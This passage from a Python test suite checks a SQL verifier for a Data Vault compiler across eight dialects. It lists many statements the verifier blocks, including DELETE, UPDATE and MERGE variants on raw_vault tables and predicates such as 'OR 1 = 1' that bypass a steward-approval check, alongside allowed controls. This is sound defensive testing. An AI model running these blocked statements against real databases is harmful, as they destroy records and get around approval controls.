    """Block multi-paren aliases, T-SQL DELETE TOP, LATERAL/CROSS APPLY, CTE INSERT mutations, ClickHouse REPLACE PARTITION, and SHA256 DV-AST-003; allow controls."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    must_block_all = [
        # 1. Multi-parenthesized derived-table aliases
        "UPDATE h SET bkcc = 'X' FROM ((SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer)) AS h",
        "DELETE h FROM ((SELECT hk_issuer FROM raw_vault.hub_issuer)) AS h",
        "DELETE FROM h USING ((SELECT hk_issuer FROM raw_vault.hub_issuer)) AS h",
        "UPDATE h SET bkcc = 'X' FROM (((SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer))) AS h",
        "WITH cte AS (SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer) UPDATE h SET bkcc = 'X' FROM ((SELECT hk_issuer, bkcc FROM cte)) AS h",
        "UPDATE h SET bkcc = 'X' FROM staging.s AS s JOIN ((SELECT hk_issuer, bkcc FROM raw_vault.hub_issuer)) AS h ON s.hk = h.hk_issuer",
        # 4. LATERAL derived tables across all 8 dialects
        "WITH cte AS (SELECT x.hk_issuer FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS x) DELETE FROM cte",
        "WITH cte AS (SELECT x.hk_issuer FROM staging.s AS s CROSS JOIN LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS x) DELETE FROM cte",
        "UPDATE h SET bkcc = 'X' FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
        "UPDATE h SET bkcc = 'X' FROM (staging.s AS s CROSS JOIN LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h)",
    ]
    must_allow_all = [
        # 2. Explicit FROM/derived alias shadowing a CTE name
        "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE c FROM staging.s AS c",
        "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE c FROM ((SELECT id FROM staging.s)) AS c",
        # 4. Allowed LATERAL read control
        "UPDATE staging.s SET x = 1 FROM staging.s AS s, LATERAL (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h",
        # 5. Plain append-only INSERT into CTE remains allowed
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT INTO cte (hk_issuer) SELECT hk FROM staging.s",
        "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT INTO cte (hk_issuer) SELECT hk FROM staging.s ON CONFLICT (hk_issuer) DO NOTHING",
    ]

    for tid in SQL_TARGET_IDS:
        for sql in must_block_all:
            diags = verifier.verify_sql(sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (tid, sql, diags)
            with pytest.raises(OpenDVError) as exc:
                gate.verify_sql_ast(tid, sql)
            assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc.value.exit_code == 50
        for sql in must_allow_all:
            assert verifier.verify_sql(sql, tid) == [], (tid, sql)

    # 3. T-SQL DELETE TOP (N), 4. CROSS APPLY, 5. CTE INSERT OVERWRITE / ON CONFLICT DO UPDATE, 6. ClickHouse REPLACE PARTITION
    dialect_block = [
        ("sqlserver_fabric", "DELETE TOP (10) FROM raw_vault.hub_issuer"),
        ("sqlserver_fabric", "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE TOP (10) FROM cte"),
        ("sqlserver_fabric", "WITH cte AS (SELECT x.hk_issuer FROM staging.s AS s CROSS APPLY (SELECT hk_issuer FROM raw_vault.hub_issuer) AS x) DELETE FROM cte"),
        ("sqlserver_fabric", "UPDATE h SET bkcc = 'X' FROM staging.s AS s CROSS APPLY (SELECT hk_issuer FROM raw_vault.hub_issuer) AS h"),
        ("databricks_uc", "WITH cte AS (SELECT x.hk_issuer FROM staging.s AS s CROSS APPLY (SELECT hk_issuer FROM raw_vault.hub_issuer) AS x) DELETE FROM cte"),
        ("snowflake", "WITH cte AS (SELECT x.hk_issuer FROM staging.s AS s CROSS APPLY (SELECT hk_issuer FROM raw_vault.hub_issuer) AS x) DELETE FROM cte"),
        ("databricks_uc", "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT OVERWRITE TABLE cte SELECT 'a'"),
        ("duckdb_local", "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT OVERWRITE TABLE cte SELECT 'a'"),
        ("postgres", "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT INTO cte (hk_issuer) SELECT hk FROM staging.s ON CONFLICT (hk_issuer) DO UPDATE SET hk_issuer = 'x'"),
        ("duckdb_local", "WITH cte AS (SELECT hk_issuer FROM raw_vault.hub_issuer) INSERT INTO cte (hk_issuer) SELECT hk FROM staging.s ON CONFLICT (hk_issuer) DO UPDATE SET hk_issuer = 'x'"),
        ("clickhouse", "ALTER TABLE raw_vault.hub_issuer REPLACE PARTITION '202601' FROM staging.s"),
    ]
    for tid, sql in dialect_block:
        diags = verifier.verify_sql(sql, tid)
        assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (tid, sql, diags)
        with pytest.raises(OpenDVError) as exc:
            gate.verify_sql_ast(tid, sql)
        assert exc.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc.value.exit_code == 50

    assert verifier.verify_sql("DELETE TOP (10) FROM staging.s", "sqlserver_fabric") == []
    assert verifier.verify_sql("DELETE s FROM raw_vault.hub_issuer AS h JOIN staging.s AS s ON s.hk = h.hk", "sqlserver_fabric") == []
    assert verifier.verify_sql("ALTER TABLE staging.s REPLACE PARTITION '202601' FROM raw_vault.hub_issuer", "clickhouse") == []

    # 7. SHA256 parsed as exp.SHA2Digest (S_H_A2_DIGEST) triggers DV-AST-003 when '-1:^^' is missing
    for tid in ("postgres", "bigquery", "redshift"):
        sha_diags = verifier.verify_sql(
            "SELECT SHA256(OCTET_LENGTH(c) || ':' || c) AS hk_x FROM staging.s", tid
        )
        assert any(d.rule_id == "DV-AST-003" and d.severity == "BLOCKER" for d in sha_diags), (tid, sha_diags)

    # 10. Recursive Iceberg field_id uniqueness check catches nested list/struct duplicate IDs
    ir = _build_enterprise_11type_ir()
    ice_dir = tmp_path / "iceberg_nested_dup"
    IcebergEmitter().emit(ir, output_dir=ice_dir)
    meta_path = sorted(ice_dir.rglob("v1.metadata.json"))[0]
    meta_data = json.loads(meta_path.read_text(encoding="utf-8"))
    meta_data["schemas"][0]["fields"].append(
        {
            "id": 900,
            "name": "nested_dup_list",
            "required": False,
            "type": {
                "type": "list",
                "element-id": 901,
                "element-required": False,
                "element": {
                    "type": "list",
                    "element-id": 901,
                    "element-required": False,
                    "element": "string",
                },
            },
        }
    )
    meta_path.write_text(json.dumps(meta_data), encoding="utf-8")
    with pytest.raises(OpenDVError) as exc_ice:
        gate.verify_format_bundle("iceberg", ice_dir, ir)
    assert exc_ice.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_ice.value.exit_code == 50


def test_iter11_md5_digest_and_delete_using_cte_non_shadowing() -> None:
    """Block MD5_DIGEST (bigquery/clickhouse) DV-AST-002/003 and DELETE FROM cte USING ... AS cte while preserving allowed controls."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    for tid in SQL_TARGET_IDS:
        # 1. MD5(c) parsed as exp.MD5Digest on bigquery/clickhouse must emit DV-AST-002 and DV-AST-003
        md5_sql = "SELECT MD5(c) AS hk_test FROM staging.s"
        md5_diags = verifier.verify_sql(md5_sql, tid)
        md5_rules = {d.rule_id for d in md5_diags if d.severity == "BLOCKER"}
        assert {"DV-AST-002", "DV-AST-003"} <= md5_rules, (tid, md5_diags)
        with pytest.raises(OpenDVError) as exc_md5:
            gate.verify_sql_ast(tid, md5_sql)
        assert exc_md5.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_md5.value.exit_code == 50

        # 2. DELETE FROM <cte> USING <staging> AS <cte> must NOT let USING alias shadow cte_map
        for blocked_sql in (
            "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE FROM c USING staging.s AS c",
            "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE FROM c USING (SELECT id FROM staging.s) AS c",
            "DELETE FROM h USING (raw_vault.hub_issuer AS h)",
        ):
            diags = verifier.verify_sql(blocked_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (
                tid,
                blocked_sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc_del:
                gate.verify_sql_ast(tid, blocked_sql)
            assert exc_del.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_del.value.exit_code == 50

        # 3. Allowed controls remain clean ([])
        for allowed_sql in (
            "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) DELETE c FROM staging.s AS c",
            "DELETE FROM staging.s USING staging.s2 AS s2",
        ):
            assert verifier.verify_sql(allowed_sql, tid) == [], (tid, allowed_sql)


def test_iter12_hash_dialect_variants_update_cte_and_parquet_bool_csv(tmp_path: Path) -> None:
    """Block all hash digest dialect variants & non-T-SQL UPDATE CTE shadowing; parse CSV booleans accurately."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()

    # 1. Hash digest dialect variants must emit DV-AST-002 + DV-AST-003 across all 8 SQL dialects
    hash_exprs = (
        "SHA(c)",
        "SHA1(c)",
        "SHA1_HEX(c)",
        "SHA1_BINARY(c)",
        "FUNC_SHA1(c)",
        "SHA224(c)",
        "SHA384(c)",
        "SHA512(c)",
        "SHA2_HEX(c, 256)",
        "MD5_HEX(c)",
        "MD5_BINARY(c)",
        "DIGEST(c)",
        "STANDARD_HASH(c)",
        "MD5_NUMBER_LOWER64(c)",
        "MD5_NUMBER_UPPER64(c)",
    )
    for tid in SQL_TARGET_IDS:
        for expr_sql in hash_exprs:
            sql = f"SELECT {expr_sql} AS hk_issuer FROM staging.s"
            diags = verifier.verify_sql(sql, tid)
            rules = {d.rule_id for d in diags if d.severity == "BLOCKER"}
            assert {"DV-AST-002", "DV-AST-003"} <= rules, (tid, sql, diags)
            with pytest.raises(OpenDVError) as exc_hash:
                gate.verify_sql_ast(tid, sql)
            assert exc_hash.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_hash.value.exit_code == 50

    # 2. Non-T-SQL WITH c AS (...) UPDATE c ... FROM staging.s AS c must NOT shadow cte_map
    upd_shadow_sql = "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) UPDATE c SET bkcc = 'X' FROM staging.s AS c"
    for tid in SQL_TARGET_IDS:
        if tid == "sqlserver_fabric":
            assert verifier.verify_sql(upd_shadow_sql, tid) == []
            assert any(
                d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
                for d in verifier.verify_sql(
                    "WITH c AS (SELECT hk_issuer FROM raw_vault.hub_issuer) UPDATE c SET bkcc = 'X'",
                    tid,
                )
            )
        else:
            diags = verifier.verify_sql(upd_shadow_sql, tid)
            assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in diags), (tid, diags)
            with pytest.raises(OpenDVError) as exc_upd:
                gate.verify_sql_ast(tid, upd_shadow_sql)
            assert exc_upd.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_upd.value.exit_code == 50

    # 3. ParquetEmitter._coerce_arrow_value & materialize_parquet_local CSV boolean handling
    for truthy in ("true", "TRUE", "1", "t", "T", "yes", " YES ", True, 1):
        assert _coerce_arrow_value(truthy, "BOOLEAN") is True
    for falsy in ("false", "FALSE", "0", "f", "F", "no", " NO ", False, 0):
        assert _coerce_arrow_value(falsy, "BOOLEAN") is False
    with pytest.raises(ValueError, match="Invalid boolean literal"):
        _coerce_arrow_value("maybe", "BOOLEAN")

    csv_path = tmp_path / "bools.csv"
    csv_path.write_text("id,flag\n1,false\n2,true\n3,0\n4,NO\n5,yes\n", encoding="utf-8")
    b_cols = [
        IRField(field_id=1, name="id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
        IRField(field_id=2, name="flag", logical_type="BOOLEAN", nullable=False, is_pii=False),
    ]
    r_hk = HashRecipeSpec(
        target_col="hk_item", recipe_kind="HUB_HK", bkcc_literal="GLOBAL",
        source_columns=["id"], sort_alphabetically=False, key_columns=["id"],
    )
    r_hd = HashRecipeSpec(
        target_col="hash_diff", recipe_kind="SAT_HASH_DIFF",
        source_columns=["flag"], sort_alphabetically=True, key_columns=["hk_item"],
    )
    ir_bool = CertifiedVaultIR(
        project_id="proj_csv_bool",
        ontology_version="1.0.0",
        wave_number=1,
        bronze_tables=[
            BronzeTableSpec(table_name="bronze_bool", source_id="csv_s", source_table_id="csv_s:bools", columns=b_cols)
        ],
        staging_views=[
            StagingViewSpec(
                view_name="stg_bool", source_id="csv_s", source_table_id="csv_s:bools",
                col_lineage_mappings={"id": "id", "flag": "flag"}, hash_recipes=[r_hk, r_hd], projected_fields=b_cols,
            )
        ],
        hubs=[
            CertifiedHubSpec(
                hub_name="hub_item", key_tier="TIER_1_GLOBAL_STANDARD",
                business_keys=[
                    BusinessKeyPart(table_id="csv_s:bools", col_name="id", source_id="csv_s", key_tier="TIER_1_GLOBAL_STANDARD", bkcc_value="GLOBAL")
                ],
                source_bindings=[SourceBindingSpec(source_id="csv_s", table_id="csv_s:bools", col_mappings={}, hash_recipe=r_hk)],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="bkcc", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=3, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=4, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=5, name="id", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                ],
                hash_recipe=r_hk, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item"]),
            )
        ],
        satellites=[
            CertifiedSatelliteSpec(
                sat_name="sat_bool", sat_kind="STANDARD", parent_name="hub_item",
                source_id="csv_s", source_table_id="csv_s:bools",
                attributes=[DraftField(name="flag", logical_type="BOOLEAN", nullable=False, is_pii=False)],
                columns=[
                    IRField(field_id=1, name="hk_item", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=2, name="load_dts", logical_type="TIMESTAMP_UTC_US", nullable=False, is_pii=False),
                    IRField(field_id=3, name="rec_src", logical_type="UTF8_STRING", nullable=False, is_pii=False),
                    IRField(field_id=4, name="hash_diff", logical_type="FIXED_BINARY_32", nullable=False, is_pii=False),
                    IRField(field_id=5, name="flag", logical_type="BOOLEAN", nullable=False, is_pii=False),
                ],
                hash_recipe=r_hd, physical_hints=PhysicalLayoutHints(cluster_by_cols=["hk_item", "load_dts"]),
            )
        ],
    )
    pq_out = tmp_path / "pq_bool"
    res = materialize_parquet_local(
        ir_bool, pq_out, [SourceAttachment(source_id="csv_s", kind="csv", path=csv_path)]
    )
    assert res.verified is True and res.rows_loaded == 5
    tbl = pq.read_table(pq_out / "bronze/bronze_bool/wave=W001/part-00000.zstd.parquet")
    assert tbl.column("flag").to_pylist() == [False, True, False, False, True]


def test_iter13_dialect_hashes_case_insensitive_planned_hub_and_dv007_guard() -> None:
    """Block remaining dialect hashes, uppercase planned hubs (DV-AST-001), and DV-AST-007 case/predicate bypasses."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()

    # 1. Remaining dialect hash functions across all 8 SQL_TARGET_IDS
    new_hash_exprs = (
        "HASH(c)",
        "CITYHASH64(c)",
        "CITY_HASH64(c)",
        "FARM_FINGERPRINT(c)",
        "XXHASH64(c)",
        "SIPHASH64(c)",
        "HALFMD5(c)",
        "MD4(c)",
        "SHA3(c)",
        "SHA3_256(c)",
        "SHA3_512(c)",
        "BLAKE2B(c)",
        "BLAKE3(c)",
        "KECCAK256(c)",
        "CHECKSUM(c)",
        "BINARY_CHECKSUM(c)",
        "CRC32(c)",
        "MURMUR_HASH(c)",
    )
    for tid in SQL_TARGET_IDS:
        for expr_sql in new_hash_exprs:
            sql = f"SELECT {expr_sql} AS hk_issuer FROM staging.s"
            diags = verifier.verify_sql(sql, tid)
            rules = {d.rule_id for d in diags if d.severity == "BLOCKER"}
            assert {"DV-AST-002", "DV-AST-003"} <= rules, (tid, sql, diags)
            with pytest.raises(OpenDVError) as exc_h:
                gate.verify_sql_ast(tid, sql)
            assert exc_h.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_h.value.exit_code == 50

    # 2. DV-AST-001 case-insensitive planned hub detection (DDL + DML)
    for tid in SQL_TARGET_IDS:
        for planned_sql in (
            "SELECT hk FROM raw_vault.HUB_PLANNED_CLEARING_HOUSE",
            "CREATE TABLE raw_vault.HUB_PLANNED_CLEARING_HOUSE (hk VARCHAR(64))",
            "SELECT hk FROM raw_vault.Hub_Planned_Clearing_House",
        ):
            p_diags = verifier.verify_sql(planned_sql, tid, ir=ir)
            assert any(d.rule_id == "DV-AST-001" and d.severity == "BLOCKER" for d in p_diags), (
                tid,
                planned_sql,
                p_diags,
            )
            with pytest.raises(OpenDVError) as exc_p:
                gate.verify_sql_ast(tid, planned_sql, ir=ir)
            assert exc_p.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_p.value.exit_code == 50

    # 3. DV-AST-007 case-insensitive target & real enforcing steward_gate_status = 'APPROVED' guard
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )
    blocked_dv007 = (
        "INSERT INTO raw_vault.LNK_U (hk_u) SELECT hk FROM staging.s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE steward_gate_status <> 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE NOT (steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE (steward_gate_status = 'APPROVED') = FALSE",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED' OR 1 = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE 1 = 1 OR (a = 1 AND steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT (SELECT MAX(hk) FROM staging.s2 WHERE steward_gate_status = 'APPROVED') FROM staging.s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE NOT EXISTS (SELECT 1 FROM staging.s2 WHERE steward_gate_status = 'APPROVED')",
        "MERGE INTO raw_vault.LNK_U AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT hk FROM staging.s WHERE steward_gate_status <> 'APPROVED') AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        "MERGE INTO raw_vault.LNK_U AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u AND s.steward_gate_status = 'APPROVED' WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
    )
    allowed_dv007 = (
        "INSERT INTO raw_vault.LNK_U (hk_u) SELECT hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND (a = 1 OR b = 2)",
        "INSERT INTO raw_vault.LNK_U (hk_u) SELECT hk FROM staging.s WHERE 'APPROVED' = steward_gate_status",
        "MERGE INTO raw_vault.LNK_U AS tgt USING (SELECT hk FROM staging.s AS src WHERE src.steward_gate_status = 'APPROVED') AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
    )
    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_dv007:
            d_bad = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in d_bad), (
                tid,
                bad_sql,
                d_bad,
            )
            bad_ir_sql = bad_sql.replace("lnk_u", "lnk_doc_claim").replace("LNK_U", "LNK_DOC_CLAIM")
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_ir_sql, ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50
        for ok_sql in allowed_dv007:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )
            ok_ir_sql = ok_sql.replace("lnk_u", "lnk_doc_claim").replace("LNK_U", "LNK_DOC_CLAIM")
            assert gate.verify_sql_ast(tid, ok_ir_sql, ir=ir_unstruct) == [], (tid, ok_ir_sql)
        ir_bad = verifier.verify_sql(
            "INSERT INTO raw_vault.LNK_DOC_CLAIM (hk) SELECT hk FROM staging.s WHERE steward_gate_status <> 'APPROVED'",
            tid,
            ir=ir_unstruct,
        )
        assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in ir_bad), (tid, ir_bad)
        assert (
            verifier.verify_sql(
                "INSERT INTO raw_vault.LNK_DOC_CLAIM (hk) SELECT hk FROM staging.s WHERE s.steward_gate_status = 'APPROVED'",
                tid,
                ir=ir_unstruct,
            )
            == []
        ), tid


def test_iter14_unstructured_link_compiled_seed_structural_dv007_and_hash_aliases() -> None:
    """Compiled UNSTRUCTURED_EXTRACTION_LINK passes 8/8 + Prover; structural DV-AST-007 bypasses, new hashes, and 1-arg HASHBYTES fail."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    # 1. Compiled UNSTRUCTURED_EXTRACTION_LINK passes TargetEvalGate across all 8/8 dialects + DuckDbProverAdapter
    for tid in SQL_TARGET_IDS:
        bundle = SqlGlotVaultCompiler(tid).compile(ir_unstruct)
        assert gate.verify_sql_ast(tid, bundle.full_sql, ir=ir_unstruct) == [], tid

    rep = DuckDbProverAdapter().prove(ir_unstruct, [])
    assert rep.ast_violations == []
    assert len(rep.dyn_results) == 15 and all(rep.dyn_results.values())

    # 2. Fake seed / VALUES bypasses & all structural DV-AST-007 bypasses must emit DV-AST-007 across 8/8 dialects
    blocked_structural = (
        "INSERT INTO raw_vault.lnk_u VALUES ('abc')",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT 'abc' AS hk_u, 'SYSTEM_SEED' AS rec_src",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT 'abc', 'SYSTEM_SEED'",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT UNHEX(REPEAT('00', 32)) AS hk_u, 'SYSTEM_SEED' AS rec_src FROM staging.s",
        "WITH unused AS (SELECT 1 FROM staging.s2 WHERE steward_gate_status = 'APPROVED') INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED' UNION ALL SELECT hk FROM staging.s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED' UNION SELECT hk FROM staging.s",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE EXISTS (SELECT 1 FROM staging.s2 WHERE steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE hk IN (SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE (SELECT COUNT(*) FROM staging.s2 WHERE steward_gate_status = 'APPROVED') > 0",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE COALESCE((SELECT 1 FROM staging.s2 WHERE steward_gate_status = 'APPROVED' LIMIT 1), 1) = 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s ORDER BY (SELECT MAX(hk) FROM staging.s2 WHERE steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s GROUP BY hk HAVING COUNT(*) > (SELECT 0 FROM staging.s2 WHERE steward_gate_status = 'APPROVED')",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a RIGHT JOIN staging.s2 b ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a FULL OUTER JOIN staging.s2 b ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM staging.s2 b RIGHT JOIN (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM staging.s2 b LEFT JOIN (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a ON a.hk = b.hk",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u WHEN MATCHED AND s.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s.hk_u) WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u WHEN MATCHED AND s.steward_gate_status = 'APPROVED' THEN DO NOTHING WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED AND s.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s.hk_u) WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (s.hk_u)",
    )
    allowed_structural = (
        "WITH c AS (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') AS sub",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a LEFT JOIN staging.s2 b ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM staging.s2 b INNER JOIN (SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED') a ON a.hk = b.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s WHERE steward_gate_status = 'APPROVED' UNION ALL SELECT hk FROM staging.s2 WHERE steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s AS s ON tgt.hk_u = s.hk_u WHEN NOT MATCHED AND s.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s.hk_u)",
    )
    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_structural:
            if tid in ("bigquery", "clickhouse") and " UNION SELECT " in bad_sql:
                continue
            d_bad = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in d_bad), (
                tid,
                bad_sql,
                d_bad,
            )
        for ok_sql in allowed_structural:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )

    # 3. Remaining 16 dialect hash aliases + 1-arg T-SQL HASHBYTES ValueError
    extra_hashes = (
        "SHA1_DIGEST", "SHA2_DIGEST", "HASH_AGG", "FNV_HASH", "FARM_FINGERPRINT64",
        "FARMHASH64", "XXHASH32", "XXH32", "XXH64", "XXH3", "XXH3_64", "XXH3_128",
        "SHA512_256", "MURMUR3_32_HASH", "MURMUR3_64_HASH", "MD2",
    )
    for tid in SQL_TARGET_IDS:
        for fn in extra_hashes:
            rules = {
                d.rule_id
                for d in verifier.verify_sql(f"SELECT {fn}(c) AS hk_issuer FROM staging.s", tid)
                if d.severity == "BLOCKER"
            }
            assert {"DV-AST-002", "DV-AST-003"} <= rules, (tid, fn, rules)

    hb_diags = verifier.verify_sql("SELECT HASHBYTES(c) AS hk_test FROM staging.s", "sqlserver_fabric")
    assert any(d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER" for d in hb_diags), hb_diags
    with pytest.raises(OpenDVError) as exc_hb:
        gate.verify_sql_ast("sqlserver_fabric", "SELECT HASHBYTES(c) AS hk_test FROM staging.s")
    assert exc_hb.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
    assert exc_hb.value.exit_code == 50


def test_iter15_dv007_merge_on_cross_comma_join_and_seed_structural_hardening(tmp_path: Path) -> None:
    """Block MERGE ON inversion, CROSS/comma/1=1 joins, and all fake Zero-Key SYSTEM_SEED tricks across 8/8 dialects."""
